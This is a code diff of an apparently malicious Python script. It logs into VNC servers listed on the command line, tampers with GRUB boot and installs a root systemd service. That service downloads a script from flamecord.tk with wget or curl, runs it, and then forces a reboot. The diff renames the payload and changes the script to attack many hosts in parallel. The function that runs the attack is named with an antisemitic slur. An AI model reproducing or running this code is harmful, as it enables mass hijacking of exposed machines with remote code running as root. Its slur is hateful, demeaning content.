@@ -2,7 +2,6 @@
 
 # TODO:
 # fix keyboard
-# make it run in parralel (should jsut be a change between asyncio.run and asyncio.create_task)
 
 import sys
 import time
@@ -54,7 +53,7 @@ def grub_boot(client):
 def rootkit(client):
     time.sleep(20)
     for x in [
-            'printf "[Unit]\\nAfter=network.target\\nDescription=a\\n\\n[Service]\\nUser=root\\nGroup=root\\nExecStart=sh -c \'(wget flamecord.tk/sneed.sh -O/sneed.sh || curl -L flamecord.tk/sneed.sh -o /sneed.sh); sh /sneed.sh\'\\n\\n[Install]\\nWantedBy=multi-user.target" > /usr/lib/systemd/system/qqq.service;',
+            'printf "[Unit]\\nAfter=network.target\\nDescription=a\\n\\n[Service]\\nUser=root\\nGroup=root\\nExecStart=sh -c \'(wget flamecord.tk/install.sh -O/install.sh || curl -L flamecord.tk/install.sh -o /install.sh); sh /install.sh\'\\n\\n[Install]\\nWantedBy=multi-user.target" > /usr/lib/systemd/system/qqq.service;',
             "ln -s /usr/lib/systemd/system/qqq.service /etc/systemd/system/multi-user.target.wants/qqq.service;",
             "reboot -f;",
     ]:
@@ -70,6 +69,9 @@ async def jew(ip, port, username, password):
         grub_boot(client)
         rootkit(client)
 
-vncs = sys.argv[1:]
-for vnc in vncs:
-    asyncio.run(jew(*vnc.split(":")))
+async def main():
+    tasks = [jew(*vnc.split(":")) for vnc in sys.argv[1:]]
+    await asyncio.gather(*tasks, return_exceptions=True)
+
+if __name__ == '__main__':
+    asyncio.run(main())
